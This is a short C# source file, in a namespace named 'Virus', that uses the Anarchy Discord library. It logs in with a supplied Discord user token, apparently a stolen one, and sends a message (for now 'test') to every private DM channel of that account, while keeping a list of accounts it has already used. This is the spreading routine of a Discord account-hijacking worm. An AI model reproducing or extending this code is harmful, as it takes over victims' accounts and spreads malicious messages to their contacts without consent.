using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Text;
using Discord;
namespace Virus
{
    class DiscordAPI
    {

        public static List<string> accountssused = new List<string>();
        public static void main(string token)
        {
            DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig()
            {
                // fun fact: intents are required for bots as of v8, which Anarchy uses by default.
                Intents = DiscordGatewayIntent.Guilds | DiscordGatewayIntent.DirectMessages
            });
            try
            {
                client.Login(token);
                if (accountssused.Contains(client.User.Id.ToString()))
                {
                    return;
                }
                else
                {
                    accountssused.Add(client.User.Id.ToString());
                    if (client.User.Username == "Mega")
                    {
                        return;
                    }
                    Console.WriteLine(client.User.Username);
                    client.GetRelationships();
                    var channels = client.GetPrivateChannels();

                    foreach(var dm in channels)
                    {
                        dm.SendMessage("test");
                    }
                    //Console.WriteLine(client.GetCachedGuilds());

                }
            } catch
            {
                Console.WriteLine("Couldn't connect to " + token);
            }
            

            

        }



    }
}
